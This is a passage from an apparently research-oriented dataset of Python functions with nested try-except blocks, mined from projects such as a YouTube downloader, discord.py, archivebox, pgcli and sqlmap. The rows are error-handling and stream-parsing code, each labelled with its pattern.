                # FIXME: still relevant?
                if cookies:
                    # Load necessary cookies into headers (for age-restricted videos)
                    consent, ssid, hsid, sid = 'YES', '', '', ''
                    for cookie in cookies:
                        if cookie.domain.endswith('.youtube.com'):
                            if cookie.name == 'SSID':
                                ssid = cookie.value
                            elif cookie.name == 'HSID':
                                hsid = cookie.value
                            elif cookie.name == 'SID':
                                sid = cookie.value
                    cookie_str = 'CONSENT=%s; SSID=%s; HSID=%s; SID=%s' % (consent, ssid, hsid, sid)

                    video_page = get_content('https://www.youtube.com/watch?v=%s' % self.vid,
                                             headers={'Cookie': cookie_str})
                else:
                    video_page = get_content('https://www.youtube.com/watch?v=%s' % self.vid)

                try:
                    ytplayer_config = json.loads(re.search('ytplayer.config\s*=\s*([^\n]+});ytplayer', video_page).group(1))
                except:
                    msg = re.search('class=""message"">([^<]+)<', video_page).group(1)
                    log.wtf('[Failed] Got message ""%s"". Try to login with --cookies.' % msg.strip())

                if 'title' in ytplayer_config['args']:
                    # 150 Restricted from playback on certain sites
                    # Parse video page instead
                    self.title = ytplayer_config['args']['title']
                    self.html5player = 'https://www.youtube.com' + ytplayer_config['assets']['js']
                    stream_list = ytplayer_config['args']['url_encoded_fmt_stream_map'].split(',')
                else:
                    log.wtf('[Error] The uploader has not made this video available in your country.', exit_code=None)
                    raise
                    #self.title = re.search('<meta name=""title"" content=""([^""]+)""', video_page).group(1)
                    #stream_list = []

            elif video_info['errorcode'] == ['100']:
                log.wtf('[Failed] This video does not exist.', exit_code=None) #int(video_info['errorcode'][0])
                raise

            else:
                log.wtf('[Failed] %s' % video_info['reason'][0], exit_code=None) #int(video_info['errorcode'][0])
                raise

        else:
            log.wtf('[Failed] Invalid status.', exit_code=None)
            raise

        # YouTube Live
        if ytplayer_config and (ytplayer_config['args'].get('livestream') == '1' or ytplayer_config['args'].get('live_playback') == '1'):
            if 'hlsvp' in ytplayer_config['args']:
                hlsvp = ytplayer_config['args']['hlsvp']
            else:
                player_response= json.loads(ytplayer_config['args']['player_response'])
                log.e('[Failed] %s' % player_response['playabilityStatus']['reason'], exit_code=1)

            if 'info_only' in kwargs and kwargs['info_only']:
                return
            else:
                download_url_ffmpeg(hlsvp, self.title, 'mp4')
                exit(0)

        for stream in stream_list:
            if isinstance(stream, str):
                metadata = parse.parse_qs(stream)
                stream_itag = metadata['itag'][0]
                self.streams[stream_itag] = {
                    'itag': metadata['itag'][0],
                    'url': metadata['url'][0],
                    'sig': metadata['sig'][0] if 'sig' in metadata else None,
                    's': metadata['s'][0] if 's' in metadata else None,
                    'quality': metadata['quality'][0] if 'quality' in metadata else None,
                    #'quality': metadata['quality_label'][0] if 'quality_label' in metadata else None,
                    'type': metadata['type'][0],
                    'mime': metadata['type'][0].split(';')[0],
                    'container': mime_to_container(metadata['type'][0].split(';')[0]),
                }
            else:
                stream_itag = str(stream['itag'])
                self.streams[stream_itag] = {
                    'itag': str(stream['itag']),
                    'url': stream['url'] if 'url' in stream else None,
                    'sig': None,
                    's': None,
                    'quality': stream['quality'],
                    'type': stream['mimeType'],
                    'mime': stream['mimeType'].split(';')[0],
                    'container': mime_to_container(stream['mimeType'].split(';')[0]),
                }
                if 'signatureCipher' in stream:
                    self.streams[stream_itag].update(dict([(_.split('=')[0], parse.unquote(_.split('=')[1]))
                                                           for _ in stream['signatureCipher'].split('&')]))

        # Prepare caption tracks
        try:
            try:
                caption_tracks = json.loads(ytplayer_config['args']['player_response'])['captions']['playerCaptionsTracklistRenderer']['captionTracks']
            except:
                caption_tracks = ytInitialPlayerResponse['captions']['playerCaptionsTracklistRenderer']['captionTracks']
            for ct in caption_tracks:
                ttsurl, lang = ct['baseUrl'], ct['languageCode']

                tts_xml = parseString(get_content(ttsurl))
                transcript = tts_xml.getElementsByTagName('transcript')[0]
                texts = transcript.getElementsByTagName('text')
                srt = """"; seq = 0
                for text in texts:
                    if text.firstChild is None: continue # empty element
                    seq += 1
                    start = float(text.getAttribute('start'))
                    if text.getAttribute('dur'):
                        dur = float(text.getAttribute('dur'))
                    else: dur = 1.0 # could be ill-formed XML
                    finish = start + dur
                    m, s = divmod(start, 60); h, m = divmod(m, 60)
                    start = '{:0>2}:{:0>2}:{:06.3f}'.format(int(h), int(m), s).replace('.', ',')
                    m, s = divmod(finish, 60); h, m = divmod(m, 60)
                    finish = '{:0>2}:{:0>2}:{:06.3f}'.format(int(h), int(m), s).replace('.', ',')
                    content = unescape_html(text.firstChild.nodeValue)

                    srt += '%s\n' % str(seq)
                    srt += '%s --> %s\n' % (start, finish)
                    srt += '%s\n\n' % content

                self.caption_tracks[lang] = srt
        except: pass

        # Prepare DASH streams (NOTE: not every video has DASH streams!)
        try:
            dashmpd = ytplayer_config['args']['dashmpd']
            dash_xml = parseString(get_content(dashmpd))
            for aset in dash_xml.getElementsByTagName('AdaptationSet'):
                mimeType = aset.getAttribute('mimeType')
                if mimeType == 'audio/mp4':
                    rep = aset.getElementsByTagName('Representation')[-1]
                    burls = rep.getElementsByTagName('BaseURL')
                    dash_mp4_a_url = burls[0].firstChild.nodeValue
                    dash_mp4_a_size = burls[0].getAttribute('yt:contentLength')
                    if not dash_mp4_a_size:
                        try: dash_mp4_a_size = url_size(dash_mp4_a_url)
                        except: continue
                elif mimeType == 'audio/webm':
                    rep = aset.getElementsByTagName('Representation')[-1]
                    burls = rep.getElementsByTagName('BaseURL')
                    dash_webm_a_url = burls[0].firstChild.nodeValue
                    dash_webm_a_size = burls[0].getAttribute('yt:contentLength')
                    if not dash_webm_a_size:
                        try: dash_webm_a_size = url_size(dash_webm_a_url)
                        except: continue
                elif mimeType == 'video/mp4':
                    for rep in aset.getElementsByTagName('Representation'):
                        w = int(rep.getAttribute('width'))
                        h = int(rep.getAttribute('height'))
                        itag = rep.getAttribute('id')
                        burls = rep.getElementsByTagName('BaseURL')
                        dash_url = burls[0].firstChild.nodeValue
                        dash_size = burls[0].getAttribute('yt:contentLength')
                        if not dash_size:
                            try: dash_size = url_size(dash_url)
                            except: continue
                        dash_urls = self.__class__.chunk_by_range(dash_url, int(dash_size))
                        dash_mp4_a_urls = self.__class__.chunk_by_range(dash_mp4_a_url, int(dash_mp4_a_size))
                        self.dash_streams[itag] = {
                            'quality': '%sx%s' % (w, h),
                            'itag': itag,
                            'type': mimeType,
                            'mime': mimeType,
                            'container': 'mp4',
                            'src': [dash_urls, dash_mp4_a_urls],
                            'size': int(dash_size) + int(dash_mp4_a_size)
                        }
                elif mimeType == 'video/webm':
                    for rep in aset.getElementsByTagName('Representation'):
                        w = int(rep.getAttribute('width'))
                        h = int(rep.getAttribute('height'))
                        itag = rep.getAttribute('id')
                        burls = rep.getElementsByTagName('BaseURL')
                        dash_url = burls[0].firstChild.nodeValue
                        dash_size = burls[0].getAttribute('yt:contentLength')
                        if not dash_size:
                            try: dash_size = url_size(dash_url)
                            except: continue
                        dash_urls = self.__class__.chunk_by_range(dash_url, int(dash_size))
                        dash_webm_a_urls = self.__class__.chunk_by_range(dash_webm_a_url, int(dash_webm_a_size))
                        self.dash_streams[itag] = {
                            'quality': '%sx%s' % (w, h),
                            'itag': itag,
                            'type': mimeType,
                            'mime': mimeType,
                            'container': 'webm',
                            'src': [dash_urls, dash_webm_a_urls],
                            'size': int(dash_size) + int(dash_webm_a_size)
                        }
        except:
            # VEVO
            if not self.html5player: return
            self.html5player = self.html5player.replace('\/', '/') # unescape URL (for age-restricted videos)
            self.js = get_content(self.html5player)

            try:
                # Video info from video page (not always available)
                streams = [dict([(i.split('=')[0],
                                  parse.unquote(i.split('=')[1]))
                                 for i in afmt.split('&')])
                           for afmt in ytplayer_config['args']['adaptive_fmts'].split(',')]
            except:
                if 'adaptive_fmts' in video_info:
                    streams = [dict([(i.split('=')[0],
                                      parse.unquote(i.split('=')[1]))
                                     for i in afmt.split('&')])
                               for afmt in video_info['adaptive_fmts'][0].split(',')]
                else:
                    try:
                        try:
                            streams = json.loads(video_info['player_response'][0])['streamingData']['adaptiveFormats']
                        except:
                            streams = ytInitialPlayerResponse['streamingData']['adaptiveFormats']
                    except:  # no DASH stream at all
                        return

                    # streams without contentLength got broken urls, just remove them (#2767)
                    streams = [stream for stream in streams if 'contentLength' in stream]

                    for stream in streams:
                        stream['itag'] = str(stream['itag'])
                        if 'qualityLabel' in stream:
                            stream['quality_label'] = stream['qualityLabel']
                            del stream['qualityLabel']
                        if 'width' in stream:
                            stream['size'] = '{}x{}'.format(stream['width'], stream['height'])
                            del stream['width']
                            del stream['height']
                        stream['type'] = stream['mimeType']
                        stream['clen'] = stream['contentLength']
                        stream['init'] = '{}-{}'.format(
                            stream['initRange']['start'],
                            stream['initRange']['end'])
                        stream['index'] = '{}-{}'.format(
                            stream['indexRange']['start'],
                            stream['indexRange']['end'])
                        del stream['mimeType']
                        del stream['contentLength']
                        del stream['initRange']
                        del stream['indexRange']
                        if 'signatureCipher' in stream:
                            stream.update(dict([(_.split('=')[0], parse.unquote(_.split('=')[1]))
                                                for _ in stream['signatureCipher'].split('&')]))
                            del stream['signatureCipher']

            for stream in streams: # get over speed limiting
                stream['url'] += '&ratebypass=yes'
            for stream in streams: # audio
                if stream['type'].startswith('audio/mp4'):
                    dash_mp4_a_url = stream['url']
                    if 's' in stream:
                        sig = self.__class__.s_to_sig(self.js, stream['s'])
                        dash_mp4_a_url += '&sig={}'.format(sig)
                    dash_mp4_a_size = stream['clen']
                elif stream['type'].startswith('audio/webm'):
                    dash_webm_a_url = stream['url']
                    if 's' in stream:
                        sig = self.__class__.s_to_sig(self.js, stream['s'])
                        dash_webm_a_url += '&sig={}'.format(sig)
                    dash_webm_a_size = stream['clen']
            for stream in streams: # video
                if 'size' in stream:
                    if stream['type'].startswith('video/mp4'):
                        mimeType = 'video/mp4'
                        dash_url = stream['url']
                        if 's' in stream:
                            sig = self.__class__.s_to_sig(self.js, stream['s'])
                            dash_url += '&sig={}'.format(sig)
                        dash_size = stream['clen']
                        itag = stream['itag']
                        dash_urls = self.__class__.chunk_by_range(dash_url, int(dash_size))
                        dash_mp4_a_urls = self.__class__.chunk_by_range(dash_mp4_a_url, int(dash_mp4_a_size))
                        self.dash_streams[itag] = {
                            'quality': '%s (%s)' % (stream['size'], stream['quality_label']),
                            'itag': itag,
                            'type': mimeType,
                            'mime': mimeType,
                            'container': 'mp4',
                            'src': [dash_urls, dash_mp4_a_urls],
                            'size': int(dash_size) + int(dash_mp4_a_size)
                        }
                    elif stream['type'].startswith('video/webm'):
                        mimeType = 'video/webm'
                        dash_url = stream['url']
                        if 's' in stream:
                            sig = self.__class__.s_to_sig(self.js, stream['s'])
                            dash_url += '&sig={}'.format(sig)
                        dash_size = stream['clen']
                        itag = stream['itag']
                        audio_url = None
                        audio_size = None
                        try:
                            audio_url = dash_webm_a_url
                            audio_size = int(dash_webm_a_size)
                        except UnboundLocalError as e:
                            audio_url = dash_mp4_a_url
                            audio_size = int(dash_mp4_a_size)
                        dash_urls = self.__class__.chunk_by_range(dash_url, int(dash_size))
                        audio_urls = self.__class__.chunk_by_range(audio_url, int(audio_size))
                        self.dash_streams[itag] = {
                            'quality': '%s (%s)' % (stream['size'], stream['quality_label']),
                            'itag': itag,
                            'type': mimeType,
                            'mime': mimeType,
                            'container': 'webm',
                            'src': [dash_urls, audio_urls],
                            'size': int(dash_size) + int(audio_size)
                        }",Nested Try-Except Blocks,1
253,discord.py,/home/r4ph/desenv/phd/exception-miner/projects/py/discord.py/discord/state.py,_delay_ready,"async def _delay_ready(self) -> None:
        try:
            states = []
            while True:
                # this snippet of code is basically waiting N seconds
                # until the last GUILD_CREATE was sent
                try:
                    guild = await asyncio.wait_for(self._ready_state.get(), timeout=self.guild_ready_timeout)
                except asyncio.TimeoutError:
                    break
                else:
                    if self._guild_needs_chunking(guild):
                        future = await self.chunk_guild(guild, wait=False)
                        states.append((guild, future))
                    else:
                        if guild.unavailable is False:
                            self.dispatch('guild_available', guild)
                        else:
                            self.dispatch('guild_join', guild)

            for guild, future in states:
                timeout = self._chunk_timeout(guild)

                try:
                    await asyncio.wait_for(future, timeout=timeout)
                except asyncio.TimeoutError:
                    _log.warning('Shard ID %s timed out waiting for chunks for guild_id %s.', guild.shard_id, guild.id)

                if guild.unavailable is False:
                    self.dispatch('guild_available', guild)
                else:
                    self.dispatch('guild_join', guild)

            # remove the state
            try:
                del self._ready_state
            except AttributeError:
                pass  # already been deleted somehow

        except asyncio.CancelledError:
            pass
        else:
            # dispatch the event
            self.call_handlers('ready')
            self.dispatch('ready')
        finally:
            self._ready_task = None",Nested Try-Except Blocks,1
254,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/debian/archivebox/usr/lib/python3/dist-packages/archivebox/logging_util.py,end,"def end(self):
        """"""immediately end progress, clear the progressbar line, and save end_ts""""""

        end_ts = datetime.now()
        self.stats['end_ts'] = end_ts
        
        if self.SHOW_PROGRESS:
            # terminate if we havent already terminated
            try:
                # kill the progress bar subprocess
                try:
                    self.p.close()   # must be closed *before* its terminnated
                except:
                    pass
                self.p.terminate()
                self.p.join()


                # clear whole terminal line
                try:
                    sys.stdout.write('\r{}{}\r'.format((' ' * TERM_WIDTH()), ANSI['reset']))
                except (IOError, BrokenPipeError):
                    # ignore when the parent proc has stopped listening to our stdout
                    pass
            except ValueError:
                pass",Nested Try-Except Blocks,1
255,pgcli,/home/r4ph/desenv/phd/exception-miner/projects/py/pgcli/pgcli/main.py,execute_command,"def execute_command(self, text, handle_closed_connection=True):
        logger = self.logger

        query = MetaQuery(query=text, successful=False)

        try:
            if self.destructive_warning:
                if (
                    self.destructive_statements_require_transaction
                    and not self.pgexecute.valid_transaction()
                    and is_destructive(text, self.destructive_warning)
                ):
                    click.secho(
                        ""Destructive statements must be run within a transaction.""
                    )
                    raise KeyboardInterrupt
                destroy = confirm_destructive_query(
                    text, self.destructive_warning, self.dsn_alias
                )
                if destroy is False:
                    click.secho(""Wise choice!"")
                    raise KeyboardInterrupt
                elif destroy:
                    click.secho(""Your call!"")

            output, query = self._evaluate_command(text)
        except KeyboardInterrupt:
            if self.destructive_warning_restarts_connection:
                # Restart connection to the database
                self.pgexecute.connect()
                logger.debug(""cancelled query and restarted connection, sql: %r"", text)
                click.secho(
                    ""cancelled query and restarted connection"", err=True, fg=""red""
                )
            else:
                logger.debug(""cancelled query, sql: %r"", text)
                click.secho(""cancelled query"", err=True, fg=""red"")
        except NotImplementedError:
            click.secho(""Not Yet Implemented."", fg=""yellow"")
        except OperationalError as e:
            logger.error(""sql: %r, error: %r"", text, e)
            logger.error(""traceback: %r"", traceback.format_exc())
            click.secho(str(e), err=True, fg=""red"")
            if handle_closed_connection:
                self._handle_server_closed_connection(text)
        except (PgCliQuitError, EOFError):
            raise
        except Exception as e:
            logger.error(""sql: %r, error: %r"", text, e)
            logger.error(""traceback: %r"", traceback.format_exc())
            click.secho(str(e), err=True, fg=""red"")
        else:
            try:
                if self.output_file and not text.startswith(
                    (""\\o "", ""\\? "", ""\\echo "")
                ):
                    try:
                        with open(self.output_file, ""a"", encoding=""utf-8"") as f:
                            click.echo(text, file=f)
                            click.echo(""\n"".join(output), file=f)
                            click.echo("""", file=f)  # extra newline
                    except OSError as e:
                        click.secho(str(e), err=True, fg=""red"")
                else:
                    if output:
                        self.echo_via_pager(""\n"".join(output))
            except KeyboardInterrupt:
                pass

            if self.pgspecial.timing_enabled:
                # Only add humanized time display if > 1 second
                if query.total_time > 1:
                    print(
                        ""Time: %0.03fs (%s), executed in: %0.03fs (%s)""
                        % (
                            query.total_time,
                            pendulum.Duration(seconds=query.total_time).in_words(),
                            query.execution_time,
                            pendulum.Duration(seconds=query.execution_time).in_words(),
                        )
                    )
                else:
                    print(""Time: %0.03fs"" % query.total_time)

            # Check if we need to update completions, in order of most
            # to least drastic changes
            if query.db_changed:
                with self._completer_lock:
                    self.completer.reset_completions()
                self.refresh_completions(persist_priorities=""keywords"")
            elif query.meta_changed:
                self.refresh_completions(persist_priorities=""all"")
            elif query.path_changed:
                logger.debug(""Refreshing search path"")
                with self._completer_lock:
                    self.completer.set_search_path(self.pgexecute.search_path())
                logger.debug(""Search path: %r"", self.completer.search_path)
        return query",Nested Try-Except Blocks,1
256,sqlmap,/home/r4ph/desenv/exception-miner/projects/py/sqlmap/sqlmap.py,main,"def main():
    """"""
    Main function of sqlmap when running from command line.
    """"""

    try:
        dirtyPatches()
        resolveCrossReferences()
        checkEnvironment()
        setPaths(modulePath())
        banner()

        # Store original command line options for possible later restoration
        args = cmdLineParser()
        cmdLineOptions.update(args.__dict__ if hasattr(args, ""__dict__"") else args)
        initOptions(cmdLineOptions)

        if checkPipedInput():
            conf.batch = True

        if conf.get(""api""):
            # heavy imports
            from lib.utils.api import StdDbOut
            from lib.utils.api import setRestAPILog

            # Overwrite system standard output and standard error to write
            # to an IPC database
            sys.stdout = StdDbOut(conf.taskid, messagetype=""stdout"")
            sys.stderr = StdDbOut(conf.taskid, messagetype=""stderr"")

            setRestAPILog()

        conf.showTime = True
        dataToStdout(""[!] legal disclaimer: %s\n\n"" % LEGAL_DISCLAIMER, forceOutput=True)
        dataToStdout(""[*] starting @ %s\n\n"" % time.strftime(""%X /%Y-%m-%d/""), forceOutput=True)

        init()

        if not conf.updateAll:
            # Postponed imports (faster start)
            if conf.smokeTest:
                from lib.core.testing import smokeTest
                os._exitcode = 1 - (smokeTest() or 0)
            elif conf.vulnTest:
                from lib.core.testing import vulnTest
                os._exitcode = 1 - (vulnTest() or 0)
            else:
                from lib.controller.controller import start
                if conf.profile:
                    from lib.core.profiling import profile
                    globals()[""start""] = start
                    profile()
                else:
                    try:
                        if conf.crawlDepth and conf.bulkFile:
                            targets = getFileItems(conf.bulkFile)

                            for i in xrange(len(targets)):
                                target = None

                                try:
                                    kb.targets = OrderedSet()
                                    target = targets[i]

                                    if not re.search(r""(?i)\Ahttp[s]*://"", target):
                                        target = ""http://%s"" % target

                                    infoMsg = ""starting crawler for target URL '%s' (%d/%d)"" % (target, i + 1, len(targets))
                                    logger.info(infoMsg)

                                    crawl(target)
                                except Exception as ex:
                                    if target and not isinstance(ex, SqlmapUserQuitException):
                                        errMsg = ""problem occurred while crawling '%s' ('%s')"" % (target, getSafeExString(ex))
                                        logger.error(errMsg)
                                    else:
                                        raise
                                else:
                                    if kb.targets:
                                        start()
                        else:
                            start()
                    except Exception as ex:
                        os._exitcode = 1

                        if ""can't start new thread"" in getSafeExString(ex):
                            errMsg = ""unable to start new threads. Please check OS (u)limits""
                            logger.critical(errMsg)
                            raise SystemExit
                        else:
                            raise

    except SqlmapUserQuitException:
        if not conf.batch:
            errMsg = ""user quit""
            logger.error(errMsg)

    except (SqlmapSilentQuitException, bdb.BdbQuit):
        pass

    except SqlmapShellQuitException:
        cmdLineOptions.sqlmapShell = False

    except SqlmapBaseException as ex:
        errMsg = getSafeExString(ex)
        logger.critical(errMsg)

        os._exitcode = 1

        raise SystemExit

    except KeyboardInterrupt:
        try:
            print()
        except IOError:
            pass

    except EOFError:
        print()

        errMsg = ""exit""
        logger.error(errMsg)

    except SystemExit as ex:
        os._exitcode = ex.code or 0

    except:
        print()
        errMsg = unhandledExceptionMessage()
        excMsg = traceback.format_exc()
        valid = checkIntegrity()

        os._exitcode = 255

        if any(_ in excMsg for _ in (""MemoryError"", ""Cannot allocate memory"")):
            errMsg = ""memory exhaustion detected""
            logger.critical(errMsg)
            raise SystemExit

        elif any(_ in excMsg for _ in (""No space left"", ""Disk quota exceeded"", ""Disk full while accessing"")):
            errMsg = ""no space left on output device""
            logger.critical(errMsg)
            raise SystemExit

        elif any(_ in excMsg for _ in (""The paging file is too small"",)):
            errMsg = ""no space left for paging file""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""Access is denied"", ""subprocess"", ""metasploit"")):
            errMsg = ""permission error occurred while running Metasploit""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""Permission denied"", ""metasploit"")):
            errMsg = ""permission error occurred while using Metasploit""
            logger.critical(errMsg)
            raise SystemExit

        elif ""Read-only file system"" in excMsg:
            errMsg = ""output device is mounted as read-only""
            logger.critical(errMsg)
            raise SystemExit

        elif ""Insufficient system resources"" in excMsg:
            errMsg = ""resource exhaustion detected""
            logger.critical(errMsg)
            raise SystemExit

        elif ""OperationalError: disk I/O error"" in excMsg:
            errMsg = ""I/O error on output device""
            logger.critical(errMsg)
            raise SystemExit

        elif ""Violation of BIDI"" in excMsg:
            errMsg = ""invalid URL (violation of Bidi IDNA rule - RFC 5893)""
            logger.critical(errMsg)
            raise SystemExit

        elif ""Invalid IPv6 URL"" in excMsg:
            errMsg = ""invalid URL ('%s')"" % excMsg.strip().split('\n')[-1]
            logger.critical(errMsg)
            raise SystemExit

        elif ""_mkstemp_inner"" in excMsg:
            errMsg = ""there has been a problem while accessing temporary files""
            logger.critical(errMsg)
            raise SystemExit

        elif any(_ in excMsg for _ in (""tempfile.mkdtemp"", ""tempfile.mkstemp"", ""tempfile.py"")):
            errMsg = ""unable to write to the temporary directory '%s'. "" % tempfile.gettempdir()
            errMsg += ""Please make sure that your disk is not full and ""
            errMsg += ""that you have sufficient write permissions to ""
            errMsg += ""create temporary files and/or directories""
            logger.critical(errMsg)
            raise SystemExit

        elif ""Permission denied: '"" in excMsg:
            match = re.search(r""Permission denied: '([^']*)"", excMsg)
            errMsg = ""permission error occurred while accessing file '%s'"" % match.group(1)
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""twophase"", ""sqlalchemy"")):
            errMsg = ""please update the 'sqlalchemy' package (>= 1.1.11) ""
            errMsg += ""(Reference: 'https://qiita.com/tkprof/items/7d7b2d00df9c5f16fffe')""
            logger.critical(errMsg)
            raise SystemExit

        elif ""invalid maximum character passed to PyUnicode_New"" in excMsg and re.search(r""\A3\.[34]"", sys.version) is not None:
            errMsg = ""please upgrade the Python version (>= 3.5) ""
            errMsg += ""(Reference: 'https://bugs.python.org/issue18183')""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""scramble_caching_sha2"", ""TypeError"")):
            errMsg = ""please downgrade the 'PyMySQL' package (=< 0.8.1) ""
            errMsg += ""(Reference: 'https://github.com/PyMySQL/PyMySQL/issues/700')""
            logger.critical(errMsg)
            raise SystemExit

        elif ""must be pinned buffer, not bytearray"" in excMsg:
            errMsg = ""error occurred at Python interpreter which ""
            errMsg += ""is fixed in 2.7. Please update accordingly ""
            errMsg += ""(Reference: 'https://bugs.python.org/issue8104')""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""OSError: [Errno 22] Invalid argument: '"", ""importlib"")):
            errMsg = ""unable to read file '%s'"" % extractRegexResult(r""OSError: \[Errno 22\] Invalid argument: '(?P<result>[^']+)"", excMsg)
            logger.critical(errMsg)
            raise SystemExit

        elif ""hash_randomization"" in excMsg:
            errMsg = ""error occurred at Python interpreter which ""
            errMsg += ""is fixed in 2.7.3. Please update accordingly ""
            errMsg += ""(Reference: 'https://docs.python.org/2/library/sys.html')""
            logger.critical(errMsg)
            raise SystemExit

        elif ""AttributeError: unable to access item"" in excMsg and re.search(r""3\.11\.\d+a"", sys.version):
            errMsg = ""there is a known issue when sqlmap is run with ALPHA versions of Python 3.11. ""
            errMsg += ""Please downgrade to some stable Python version""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""Resource temporarily unavailable"", ""os.fork()"", ""dictionaryAttack"")):
            errMsg = ""there has been a problem while running the multiprocessing hash cracking. ""
            errMsg += ""Please rerun with option '--threads=1'""
            logger.critical(errMsg)
            raise SystemExit

        elif ""can't start new thread"" in excMsg:
            errMsg = ""there has been a problem while creating new thread instance. ""
            errMsg += ""Please make sure that you are not running too many processes""
            if not IS_WIN:
                errMsg += "" (or increase the 'ulimit -u' value)""
            logger.critical(errMsg)
            raise SystemExit

        elif ""can't allocate read lock"" in excMsg:
            errMsg = ""there has been a problem in regular socket operation ""
            errMsg += ""('%s')"" % excMsg.strip().split('\n')[-1]
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""pymysql"", ""configparser"")):
            errMsg = ""wrong initialization of 'pymsql' detected (using Python3 dependencies)""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""ntlm"", ""socket.error, err"", ""SyntaxError"")):
            errMsg = ""wrong initialization of 'python-ntlm' detected (using Python2 syntax)""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""drda"", ""to_bytes"")):
            errMsg = ""wrong initialization of 'drda' detected (using Python3 syntax)""
            logger.critical(errMsg)
            raise SystemExit

        elif ""'WebSocket' object has no attribute 'status'"" in excMsg:
            errMsg = ""wrong websocket library detected""
            errMsg += "" (Reference: 'https://github.com/sqlmapproject/sqlmap/issues/4572#issuecomment-775041086')""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""window = tkinter.Tk()"",)):
            errMsg = ""there has been a problem in initialization of GUI interface ""
            errMsg += ""('%s')"" % excMsg.strip().split('\n')[-1]
            logger.critical(errMsg)
            raise SystemExit

        elif any(_ in excMsg for _ in (""unable to access item 'liveTest'"",)):
            errMsg = ""detected usage of files from different versions of sqlmap""
            logger.critical(errMsg)
            raise SystemExit

        elif any(_ in errMsg for _ in ("": 9.9.9#"",)):
            errMsg = ""LOL :)""
            logger.critical(errMsg)
            raise SystemExit

        elif kb.get(""dumpKeyboardInterrupt""):
            raise SystemExit

        elif any(_ in excMsg for _ in (""Broken pipe"",)):
            raise SystemExit

        elif valid is False:
            errMsg = ""code integrity check failed (turning off automatic issue creation). ""
            errMsg += ""You should retrieve the latest development version from official GitHub ""
            errMsg += ""repository at '%s'"" % GIT_PAGE
            logger.critical(errMsg)
            print()
            dataToStdout(excMsg)
            raise SystemExit

        elif any(_ in ""%s\n%s"" % (errMsg, excMsg) for _ in (""tamper/"", ""waf/"", ""--engagement-dojo"")):
            logger.critical(errMsg)
            print()
            dataToStdout(excMsg)
            raise SystemExit

        elif any(_ in excMsg for _ in (""ImportError"", ""ModuleNotFoundError"", ""<frozen"", ""Can't find file for module"", ""SAXReaderNotAvailable"", ""<built-in function compile> returned NULL without setting an exception"", ""source code string cannot contain null bytes"", ""No module named"", ""tp_name field"", ""module 'sqlite3' has no attribute 'OperationalError'"")):
            errMsg = ""invalid runtime environment ('%s')"" % excMsg.split(""Error: "")[-1].strip()
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""SyntaxError: Non-ASCII character"", "".py on line"", ""but no encoding declared"")):
            errMsg = ""invalid runtime environment ('%s')"" % excMsg.split(""Error: "")[-1].strip()
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""PermissionError: [WinError 5]"", ""multiprocessing"")):
            errMsg = ""there is a permission problem in running multiprocessing on this system. ""
            errMsg += ""Please rerun with '--disable-multi'""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""No such file"", ""_'"")):
            errMsg = ""corrupted installation detected ('%s'). "" % excMsg.strip().split('\n')[-1]
            errMsg += ""You should retrieve the latest development version from official GitHub ""
            errMsg += ""repository at '%s'"" % GIT_PAGE
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""No such file"", ""sqlmap.conf"", ""Test"")):
            errMsg = ""you are trying to run (hidden) development tests inside the production environment""
            logger.critical(errMsg)
            raise SystemExit

        elif all(_ in excMsg for _ in (""HTTPNtlmAuthHandler"", ""'str' object has no attribute 'decode'"")):
            errMsg = ""package 'python-ntlm' has a known compatibility issue with the ""
            errMsg += ""Python 3 (Reference: 'https://github.com/mullender/python-ntlm/pull/61')""
            logger.critical(errMsg)
            raise SystemExit

        elif ""'DictObject' object has no attribute '"" in excMsg and all(_ in errMsg for _ in (""(fingerprinted)"", ""(identified)"")):
            errMsg = ""there has been a problem in enumeration. ""
            errMsg += ""Because of a considerable chance of false-positive case ""
            errMsg += ""you are advised to rerun with switch '--flush-session'""
            logger.critical(errMsg)
            raise SystemExit

        elif ""database disk image is malformed"" in excMsg:
            errMsg = ""local session file seems to be malformed. Please rerun with '--flush-session'""
            logger.critical(errMsg)
            raise SystemExit

        elif ""AttributeError: 'module' object has no attribute 'F_GETFD'"" in excMsg:
            errMsg = ""invalid runtime (\""%s\"") "" % excMsg.split(""Error: "")[-1].strip()
            errMsg += ""(Reference: 'https://stackoverflow.com/a/38841364' & 'https://bugs.python.org/issue24944#msg249231')""
            logger.critical(errMsg)
            raise SystemExit

        elif ""bad marshal data (unknown type code)"" in excMsg:
            match = re.search(r""\s*(.+)\s+ValueError"", excMsg)
            errMsg = ""one of your .pyc files are corrupted%s"" % ("" ('%s')"" % match.group(1) if match else """")
            errMsg += "". Please delete .pyc files on your system to fix the problem""
            logger.critical(errMsg)
            raise SystemExit

        for match in re.finditer(r'File ""(.+?)"", line', excMsg):
            file_ = match.group(1)
            try:
                file_ = os.path.relpath(file_, os.path.dirname(__file__))
            except ValueError:
                pass
            file_ = file_.replace(""\\"", '/')
            if ""../"" in file_:
                file_ = re.sub(r""(\.\./)+"", '/', file_)
            else:
                file_ = file_.lstrip('/')
            file_ = re.sub(r""/{2,}"", '/', file_)
            excMsg = excMsg.replace(match.group(1), file_)

        errMsg = maskSensitiveData(errMsg)
        excMsg = maskSensitiveData(excMsg)

        if conf.get(""api"") or not valid:
            logger.critical(""%s\n%s"" % (errMsg, excMsg))
        else:
            logger.critical(errMsg)
            dataToStdout(""%s\n"" % setColor(excMsg.strip(), level=logging.CRITICAL))
            createGithubIssue(errMsg, excMsg)

    finally:
        kb.threadContinue = False

